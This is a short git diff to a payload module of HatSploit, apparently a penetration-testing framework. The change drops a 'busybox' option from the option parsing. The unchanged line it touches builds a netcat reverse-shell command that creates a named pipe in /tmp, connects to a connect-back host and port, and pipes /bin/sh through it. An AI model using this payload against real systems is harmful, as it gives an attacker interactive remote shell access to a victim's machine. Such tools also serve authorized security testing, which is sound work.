@@ -45,7 +45,7 @@ class HatSploitPayload(Payload, StringTools):
     }
 
     def run(self):
-        connback_host, connback_port, busybox = self.parse_options(self.options)
+        connback_host, connback_port = self.parse_options(self.options)
 
         filename = self.random_string(8)
         payload = f"mkfifo /tmp/{filename}; nc {connback_host} {connback_port} 0</tmp/{filename} | /bin/sh >/tmp/{filename} 2>&1; rm /tmp/{filename}"
